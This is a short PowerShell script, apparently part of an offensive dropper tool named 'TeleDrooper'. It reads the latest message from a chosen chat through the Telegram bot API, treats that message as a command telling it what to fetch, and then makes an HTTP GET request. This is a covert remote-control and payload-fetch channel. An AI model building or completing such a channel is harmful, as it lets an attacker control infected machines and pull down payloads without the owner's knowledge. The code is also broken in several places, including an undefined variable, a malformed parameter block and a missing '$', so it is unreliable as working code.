



function Execute-HTTPGetCommand()
{
  [CmdletBinding()]
  Param
  (
        [Parameter(Mandatory=$true, Position=0)]
        [string]$FILE
  )
  
  $webRequest = [System.Net.WebRequest]::Create($target)
  $webRequest.ServicePoint.Expect100Continue = $false
  $webRequest.Method = "Get"
  [System.Net.WebResponse]$resp = $webRequest.GetResponse()
  $rs = $resp.GetResponseStream()
  [System.IO.StreamReader]$sr = New-Object System.IO.StreamReader -argumentList $rs
  [string]$results = $sr.ReadToEnd()
  return $results
}

Function Get-File-TeleDrooper{
  Param(
  [Parameter(Mandatory=$true,Position=0)] [String[]]$BId
  [Parameter(Mandatory=$true,Position=0)] [String[]]$BToken

  )
  Write-Output "BOT ID: $BId || BOT TOKEN: BToken"


  $MyToken = "YOUR TOKEN HERE"
  $ChatID = 123456789
  $MyBotUpdates = Invoke-WebRequest -Uri "https://api.telegram.org/bot$($MyToken)/getUpdates"
  #Convert the result from json and put them in an array
  $jsonresult = [array]($MyBotUpdates | ConvertFrom-Json).result

  $LastMessage = ""
  Foreach ($Result in $jsonresult)  {
    If ($Result.message.chat.id -eq $ChatID)  {
      $LastMessage = $Result.message.text
    }
  }
   
  Write-Host "RUN ME $($LastMessage)"

  $TELEFILE = $LastMessage

  Execute-HTTPGetCommand $TELEFILE

}
